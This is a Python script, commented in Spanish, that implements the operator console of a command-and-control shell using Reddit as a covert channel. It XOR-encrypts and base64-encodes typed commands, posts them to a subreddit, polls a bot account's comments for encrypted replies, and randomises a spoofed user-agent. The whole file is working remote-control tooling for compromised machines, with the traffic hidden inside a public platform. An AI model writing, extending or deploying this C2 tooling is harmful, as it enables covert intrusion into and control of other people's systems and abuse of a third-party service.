import praw
import time
import os
import random
import string
import re
import base64


# CONFIGURACIÓN
SUBREDDIT_NAME = ""
USUARIO_BOT = ""
CLAVE_XOR = ""

# Configura tus credenciales de Reddit
reddit = praw.Reddit(
    client_id='',
    client_secret='',
    username='',
    password='',
    user_agent='X-Test-Script'
)


def generar_user_agent():
    plataformas = [
        "Windows NT 10.0; Win64; x64",
        "X11; Linux x86_64",
        "Macintosh; Intel Mac OS X 10_15_7"
    ]
    navegador = random.choice(["Firefox", "Chrome", "Edge"])
    plataforma = random.choice(plataformas)
    build = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    return f"Mozilla/5.0 ({plataforma}) {navegador}/{build} RedditShellBot"

def xor_cipher(data: str, key: str = CLAVE_XOR, modo="cifrar") -> str:
    if modo == "cifrar":
        raw = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
        return base64.b64encode(raw.encode()).decode()
    elif modo == "descifrar":
        raw = base64.b64decode(data.encode()).decode()
        return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(raw))



def enviar_comando(comando):
    cifrado = xor_cipher(comando, modo="cifrar")
    subreddit = reddit.subreddit(SUBREDDIT_NAME)
    post = subreddit.submit(title=cifrado, selftext='')
    print(f"\n[+] Comando cifrado enviado")
    print(f"    Esperando respuesta en: https://www.reddit.com{post.permalink}")
    return post

def limpiar_respuesta(mensaje: str):
    return re.sub(r"<!--sep-\d+-->", "", mensaje).strip()

def esperar_respuesta(post, timeout=180):
    start_time = time.time()
    while time.time() - start_time < timeout:
        post = reddit.submission(id=post.id)  # Recarga forzada
        post.comments.replace_more(limit=0)
        for comment in post.comments:
            print(f"[DEBUG] Visto comentario de {comment.author.name}")
            if comment.author.name == USUARIO_BOT:
                cuerpo_limpio = limpiar_respuesta(comment.body)
                return xor_cipher(cuerpo_limpio, modo="descifrar")
        print("[...] Esperando respuesta del agente...")
        time.sleep(5)
    return "[TIMEOUT] No se recibió respuesta del bot."

def shell():
    print(f"=== Reddit C2 Shell (subreddit: r/{SUBREDDIT_NAME}) ===")
    print("Escribe un comando o 'exit' para salir.\n")

    while True:
        try:
            comando = input("> ").strip()
            if comando.lower() in ["exit", "quit"]:
                break
            if not comando:
                continue

            post = enviar_comando(comando)
            respuesta = esperar_respuesta(post)
            print("\n[Respuesta del bot descifrada]\n")
            print(respuesta)
            print("\n--- Comando completado ---\n")

        except KeyboardInterrupt:
            print("\n[!] Saliendo.")
            break
        except Exception as e:
            print(f"[ERROR] {e}")

if __name__ == "__main__":
    shell()
